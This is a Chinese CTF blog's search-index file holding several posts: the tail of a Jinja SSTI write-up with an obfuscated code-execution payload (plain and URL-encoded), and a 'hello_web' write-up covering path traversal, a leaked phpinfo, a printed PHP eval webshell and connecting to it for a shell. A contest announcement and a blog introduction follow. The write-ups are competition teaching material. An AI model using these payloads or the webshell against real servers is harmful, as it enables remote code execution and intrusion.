APP:</span><br><span class="line">* Serving Flask app &#x27;app&#x27;</span><br><span class="line">* Debug mode: off</span><br><span class="line">Proxy server is running on 0.0.0.0:50001 and forwarding to 127.0.0.1:5000...</span><br><span class="line">* Running on http://127.0.0.1:5000</span><br></pre></td></tr></table></figure><ol start="5"><li><p>得到payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提交表单完成，返回值为200，</span><br><span class="line">输入为&#123;&#x27;code&#x27;: &quot;&#123;%set gl = &#x27;_&#x27;*2 + &#x27;globals&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set bu = &#x27;_&#x27;*2 + &#x27;builtins&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set im = &#x27;_&#x27;*2 + &#x27;i&#x27;&#x27;mport&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set ax = &#x27;so&#x27;[::-1]%&#125;&quot;</span><br><span class="line">&quot;&#123;&#123;cycler.next[gl][bu][im](ax)[&#x27;P&#x27;&#x27;open&#x27;](&#x27;cat /flag &gt; app.py&#x27;).read()&#125;&#125;&quot;&#125;，</span><br><span class="line">表单为&#123;&#x27;action&#x27;: &#x27;/&#x27;, &#x27;method&#x27;: &#x27;POST&#x27;, &#x27;inputs&#x27;: &#123;&#x27;code&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>对payload进行URL编码并作为参数传递</p></li></ol><ul><li><p>原payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;%set gl = &#x27;_&#x27;*2 + &#x27;globals&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set bu = &#x27;_&#x27;*2 + &#x27;builtins&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set im = &#x27;_&#x27;*2 + &#x27;i&#x27;&#x27;mport&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set ax = &#x27;so&#x27;[::-1]%&#125;&quot;</span><br><span class="line">&quot;&#123;&#123;cycler.next[gl][bu][im](ax)[&#x27;P&#x27;&#x27;open&#x27;](&#x27;cat /flag &gt; app.py&#x27;).read()&#125;&#125;&quot;</span><br></pre></td></tr></table></figure></li><li><p>进行URL编码后的payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%22%7B%25set%20gl%20%3D%20%27_%27*2%20%2B%20%27globals%27%20%2B%20%27_%27*2%25%7D%22</span><br><span class="line">%22%7B%25set%20bu%20%3D%20%27_%27*2%20%2B%20%27builtins%27%20%2B%20%27_%27*2%25%7D%22</span><br><span class="line">%22%7B%25set%20im%20%3D%20%27_%27*2%20%2B%20%27i%27%27mport%27%20%2B%20%27_%27*2%25%7D%22</span><br><span class="line">%22%7B%25set%20ax%20%3D%20%27so%27%5B%3A%3A-1%5D%25%7D%22</span><br><span class="line">%22%7B%7Bcycler.next%5Bgl%5D%5Bbu%5D%5Bim%5D(ax)%5B%27P%27%27open%27%5D(%27cat%20%2Fflag%20%3E%20app.py%27).read()%7D%7D%22</span><br></pre></td></tr></table></figure></li></ul><ol start="7"><li><p>构造code进行post提交，返回状态为ok</p></li><li><p>获取flag</p></li></ol><ul><li>get访问路由&#x2F;，就会访问到app.py</li><li>我们就可以访问到falg<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0c518973-d0c3-49c1-bb4f-44f3074f484c&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
          <category> SSTI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
            <tag> WEB </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届‘长城杯’WEB篇—Hello_web</title>
      <link href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFWEB%E7%AF%87-hello_web/"/>
      <url>/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFWEB%E7%AF%87-hello_web/</url>
      
        <content type="html"><![CDATA[<h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h1><p>这是一道经典的ssrf题目，因为题目比较简单，很多队伍都解出来了，多以这道题最后只有50分</p><h2 id="一、什么是SSRF？"><a href="#一、什么是SSRF？" class="headerlink" title="一、什么是SSRF？"></a>一、什么是SSRF？</h2><p><em><strong>SSRF</strong></em>（全称为<em><strong>Server-Side Request Forgery，服务器端请求伪造）是一种常见的</strong>安全漏洞</em><em>，属于<strong>WEB安全</strong>范畴。<br><strong>攻击者</strong>通过利用SSRF漏洞，可以让服务器在**</em>未经授权***的情况下向其他内部或外部资源发起请求，从而达到攻击的目的。</p><hr><h3 id="SSRF的原理"><a href="#SSRF的原理" class="headerlink" title="SSRF的原理"></a>SSRF的原理</h3><p>SSRF漏洞的产生主要是因为服务器端程序在处理用户提供的URL或请求参数时，<strong>没有对输入进行严格验证</strong>，直接将这些数据作为请求目标，发起HTTP&#x2F;HTTPS请求或其他协议的请求。</p><p>攻击者通过精心构造恶意的URL或输入，利用服务器发起请求，进而实现访问<strong>内部网络</strong>或受保护的资源。</p><hr><h2 id="二、本题WriteUp"><a href="#二、本题WriteUp" class="headerlink" title="二、本题WriteUp"></a>二、本题WriteUp</h2><p>题目下发后，打开地址只有如下的显示<br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_1.png" alt="初始题目展示"></p><h3 id="（一）好奇宝宝的探索"><a href="#（一）好奇宝宝的探索" class="headerlink" title="（一）好奇宝宝的探索"></a>（一）好奇宝宝的探索</h3><p>只有一句话和一段Base64编码字符串，其他就没有什么了~</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SSd2ZSBsZXQgeW91IGInbm9yZSBOaGlzIHBhcmFncmFwaC4=</span></span><br></pre></td></tr></table></figure><p>本着好奇的心，虽然也知道那是不可能的（这段Base64编码字符串就是Flag）</p><p>果然不出所料，CTF的Flag不会那么容易给你的，解码之后的内容就是对中文显示的翻译。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">I&#x27;ve</span> <span class="string">let</span> <span class="string">you</span> <span class="string">b&#x27;nore</span> <span class="string">Nhis</span> <span class="string">paragraph.</span></span><br></pre></td></tr></table></figure><h3 id="（二）查看源码，发现马脚"><a href="#（二）查看源码，发现马脚" class="headerlink" title="（二）查看源码，发现马脚"></a>（二）查看源码，发现马脚</h3><p>继续找吧，既然页面没有任何破绽，<em><strong>看看页面的源码</strong></em>，果然有问题！</p><ol><li><p>源码注释内容泄露的两个文件的路径(还是先探索一番)分别是..&#x2F;hackme.php和..&#x2F;tips.php<br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_2.png" alt="查看页面源码"></p></li><li><p>查看上一级目录的hackme.php<br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_3.png" alt="../hackme.php"></p></li><li><p>在看看上一级目录的tips.php<br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_4.png" alt="../tips.php"></p></li></ol><p>哈哈~，狗屎，就不会这么简单的，不过还没打击到我们好奇宝宝的信息</p><h3 id="（三）峰回路转，眼前答案"><a href="#（三）峰回路转，眼前答案" class="headerlink" title="（三）峰回路转，眼前答案"></a>（三）峰回路转，眼前答案</h3><p>其实他泄露的文件路径就给了我们一点点提示，既然要返回上一级目录，那么我们不妨试试<em><strong>目录穿越</strong></em></p><ul><li>这个要一级一级来，万一我们一下子穿越了两级，由于老天不给我们运气，错过了Flag就要哭死了，呜呜呜~~~</li></ul><ol><li><p>先试试一下tips.php这个文件，穿了一级就<em><strong>泄露出敏感信息</strong></em> <em><strong>Phpinfo</strong></em><br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_5.png" alt="tips.php泄露Phpinfo"></p></li><li><p>再试试hackme.php这个文件，既然能叫hackme，说明他肯定有大问题，同样穿了一级就爆出来东西<em><strong>是一个马</strong></em><br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_6.png" alt="hackme.php是一个马"></p></li><li><p>这个马是经过处理的，我们对他进行<em><strong>反混</strong></em>，得到马的密码<br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_7.png" alt="马的反混处理的到密码"></p></li></ol><ul><li>得到马的密码内容<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?&gt;&lt;?php</span> <span class="string">@eval($POST[&#x27;cmd_66.99&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>很明显，注入这个马的文件为<em><strong>cmd_66.99</strong></em>，那么我们可以直接用<em><strong>蚁剑</strong></em>通过<em><strong>disable_functions</strong></em>来连接到这个马，<em><strong>获取webshell</strong></em><br><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_8.png" alt="获取webshell"></p></li><li><p>进入shell命令行读取flag<br>在根目录下，用通配符*查找以flag开头的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web_9.png" alt="获取flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
            <tag> WEB </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届‘长城杯’铁人三项赛（防护赛）赛事详细介绍</title>
      <link href="/2024/12/16/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9D%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9C%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E9%98%B2%E6%8A%A4%E8%B5%9B)%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/12/16/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9D%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9C%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E9%98%B2%E6%8A%A4%E8%B5%9B)%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍"><a href="#第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍" class="headerlink" title="第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍"></a>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍</h1><p><img src="https://media.giphy.com/media/l41YqFxS5x6EYD7y4/giphy.gif" alt="InfoSec_Competition"> <em>激发创新，挑战极限</em></p><h2 id="一、赛事背景与目的"><a href="#一、赛事背景与目的" class="headerlink" title="一、赛事背景与目的"></a>一、赛事背景与目的</h2><p>本次竞赛由中国信息安全测评中心和教育部高等学校网络空间安全专业教学指导委员会联合主办，旨在深入践行总体国家安全观，<br>积极落实国家网络空间安全人才战略，通过竞赛形式实现以赛促学、以赛促教、以赛促用，提升网络空间安全学科教育质量和效率，<br>促进网络安全教育、技术、产业的加速融合，推动人才培养和产学研用生态发展。</p><h2 id="二、赛事组织机构"><a href="#二、赛事组织机构" class="headerlink" title="二、赛事组织机构"></a>二、赛事组织机构</h2><ul><li><strong>主办单位</strong>：中国信息安全测评中心、教育部高等学校网络空间安全专业教学指导委员会</li><li><strong>承办单位</strong>：相关高校和信息安全机构</li></ul><h2 id="三、初赛时间和地点"><a href="#三、初赛时间和地点" class="headerlink" title="三、初赛时间和地点"></a>三、初赛时间和地点</h2><ul><li><strong>时间</strong>：2024年12月15日</li><li><strong>地点</strong>：线上同步开展，全国共设置五个分赛区</li></ul><h2 id="四、赛事内容与形式"><a href="#四、赛事内容与形式" class="headerlink" title="四、赛事内容与形式"></a>四、赛事内容与形式</h2><p>竞赛分为理论知识考核和实操技能解题两个部分，涵盖信息安全基础知识、安全法律法规及标准规范、密码学、WEB安全、逆向工程、PWN等多个领域。</p><h3 id="1-理论知识考核"><a href="#1-理论知识考核" class="headerlink" title="1. 理论知识考核"></a>1. 理论知识考核</h3><ul><li><strong>信息安全基础知识</strong>：20道题，初级难度，涵盖信息安全保障、管理、支撑技术等基础知识。</li><li><strong>法律法规及安全标准</strong>：10道题，初级难度，涉及《网络安全法》、《个人信息安全保护法》等法律法规的了解程度。</li></ul><h3 id="2-实操技能解题"><a href="#2-实操技能解题" class="headerlink" title="2. 实操技能解题"></a>2. 实操技能解题</h3><ul><li><strong>威胁检测与网络流量分析</strong>：19道题，中高级难度，考查选手对恶意代码、程序、流量的识别、检测分析和还原能力。</li><li><strong>密码学</strong>：4道题，中高级难度，包括编码解码、古典密码学、现代密码学算法等。</li><li><strong>WEB安全</strong>：7道题，中高级难度，涉及WEB应用常见安全风险和网络攻击的掌握程度。</li><li><strong>逆向工程</strong>：5道题，高级难度，考查选手对二进制代码的逆向分析和理解能力。</li><li><strong>PWN</strong>：6道题，高级难度，涉及二进制漏洞的挖掘和利用能力。</li></ul><h2 id="五、参赛要求"><a href="#五、参赛要求" class="headerlink" title="五、参赛要求"></a>五、参赛要求</h2><p>参赛队伍需按照初赛参赛队伍答题要求进行答题，命题组负责赛题的罐装测试，并交由裁判组进行审核确认。赛题一经确认，任何单位和个人不得再做修改。</p><h2 id="六、奖项设置"><a href="#六、奖项设置" class="headerlink" title="六、奖项设置"></a>六、奖项设置</h2><ul><li>根据参赛队伍的总成绩，设置一、二、三等奖及优秀奖。</li><li>对于表现突出的个人选手，将颁发特别奖项。</li></ul><h2 id="七、赛事意义"><a href="#七、赛事意义" class="headerlink" title="七、赛事意义"></a>七、赛事意义</h2><p>本次竞赛不仅是对大学生信息安全知识和技能的一次全面检验，也是推动信息安全教育和实践的重要平台。<br>通过竞赛，可以激发学生的创新精神，提高解决实际问题的能力，为国家培养更多优秀的信息安全专业人才。</p><p><em>本次竞赛共吸引来自国内865所高校、4240支队伍的14145名学生参赛，涵盖全国33个省、自治区和直辖市，以及香港和澳门特别行政区。<br>来自中山大学、北京邮电大学、哈尔滨工业大学等高校共计500支战队将晋级半决赛。晋级名单将在赛事官方网站公布。</em></p><p><img src="https://media.giphy.com/media/xT9Igrx8K4JtWOia72/giphy.gif" alt="InfoSec_Challenge"> <em>网络安全，智慧对决</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，欢迎来到 HxCodeWarrior 的技术世界</title>
      <link href="/2024/12/16/hello-world/"/>
      <url>/2024/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="你好，欢迎来到-HxCodeWarrior-的技术世界！-🎉"><a href="#你好，欢迎来到-HxCodeWarrior-的技术世界！-🎉" class="headerlink" title="你好，欢迎来到 HxCodeWarrior 的技术世界！ 🎉"></a>你好，欢迎来到 HxCodeWarrior 的技术世界！ 🎉</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>你好！欢迎来到 <strong>HxCodeWarrior</strong> 博客，一个专注于技术分享的学习与交流平台。不论你是刚踏入技术领域的萌新，还是在网络安全与编程道路上探索多年的老手，我希望这里能为你提供灵感、知识和实战技能。  </p><hr><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a><strong>关于我</strong></h2><p>我是 <strong>HxCodeWarrior</strong>，一个对技术充满热爱与好奇的开发者与安全研究者。<br>从大学开始，我便投身于网络安全与编程领域：  </p><ul><li>🛡️ 参与过多次 <strong>CTF（Capture The Flag）比赛</strong>，积累了解题思路与经验；  </li><li>🕵️‍♂️ 深入研究 <strong>渗透测试</strong> 和漏洞挖掘；  </li><li>⚙️ 自主开发 <strong>黑客工具</strong>；  </li><li>🕸️ 探索爬虫技术与自动化工具开发的应用场景。</li></ul><p>多年的学习与实践让我深刻体会到分享的价值——技术世界里没有人是孤岛，我们都能通过交流获得成长。因此，我创建了这个博客，希望记录我的技术旅程，同时为更多技术爱好者提供有价值的干货内容。  </p><hr><h2 id="为什么创建-HxCodeWarrior-博客？"><a href="#为什么创建-HxCodeWarrior-博客？" class="headerlink" title="为什么创建 HxCodeWarrior 博客？"></a><strong>为什么创建 HxCodeWarrior 博客？</strong></h2><p>我的初衷很简单：  </p><ol><li><p><strong>记录成长</strong> 🎯<br>写作是对自己思路的梳理，也是一种沉淀经验的方式。我希望通过博客记录学习的过程，回顾成长中的点滴。  </p></li><li><p><strong>分享知识</strong> 💡<br>我相信，技术的意义在于共享。希望自己的文章能帮助到迷茫中的新手，或是为有经验的技术人提供一些新思路。  </p></li><li><p><strong>启发交流</strong> 🌟<br>通过分享实战经验和技巧，吸引志同道合的朋友加入讨论，一起探索技术的更多可能性。</p></li></ol><hr><h2 id="博客内容方向"><a href="#博客内容方向" class="headerlink" title="博客内容方向"></a><strong>博客内容方向</strong></h2><p>这里将持续更新以下几大技术方向的内容：  </p><ul><li><p><strong>CTF 挑战解析</strong> 🧩<br>分享 CTF 解题思路与实战技巧，包括漏洞利用、逆向分析、密码学等领域。  </p></li><li><p><strong>渗透测试实战</strong> 🔍<br>解析渗透测试工具、漏洞挖掘与防御策略，涵盖从入门到进阶的攻防实践。  </p></li><li><p><strong>黑客工具开发与使用</strong> 🛠️<br>深入探讨热门工具的功能与开发逻辑，从工具的用户变成工具的创造者。  </p></li><li><p><strong>爬虫技术教程</strong> 🕷️<br>系统讲解爬虫开发流程，从基础抓取到数据清洗与大规模自动化的高级技巧。  </p></li><li><p><strong>编程与技术教程</strong> 📜<br>涉及 Python、Selenium、Burp Suite 等工具与框架，提供从零开始的编程实践指南。</p></li></ul><hr><h2 id="适合谁看？"><a href="#适合谁看？" class="headerlink" title="适合谁看？"></a><strong>适合谁看？</strong></h2><ul><li><strong>技术小白</strong> 🎈<br>从零开始的详细教程，带你踏入网络安全与编程的世界。  </li><li><strong>正在成长的技术爱好者</strong> 🚀<br>实用的技巧与案例，帮助你快速上手并不断进步。  </li><li><strong>进阶玩家</strong> 🧠<br>深度分析与实践经验，让你在技术领域更进一步。</li></ul><hr><h2 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a><strong>社交链接</strong></h2><p>如果你喜欢我的内容，欢迎通过以下平台关注我，一起交流、学习和成长！  </p><ul><li><strong>GitHub</strong>: <a href="https://github.com/HxCodeWarrior">HxCodeWarrior</a>   </li><li><strong>Bilibili</strong>: <a href="https://space.bilibili.com/3537114050332802">HxCodeWarrior 的空间</a></li></ul><p>我会在这些平台上同步分享技术文章、视频教程，以及一些有趣的项目，期待与你互动！  </p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>技术的魅力在于无限可能，而这种可能性来自于每个人的热情与努力。<br>我希望 <strong>HxCodeWarrior</strong> 博客能成为你技术旅程中的一盏灯，帮助你发现更大的技术世界。  </p><p>无论你是想解决技术难题，还是寻找成长的灵感，我都欢迎你加入我们的学习与交流！  </p><p><strong>欢迎留言与分享你的想法，让我们一起见证彼此的成长！</strong>  </p><hr><p><strong>HxCodeWarrior</strong><br><em>记录、分享、启发，让技术更有温度。</em> ❤️  </p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
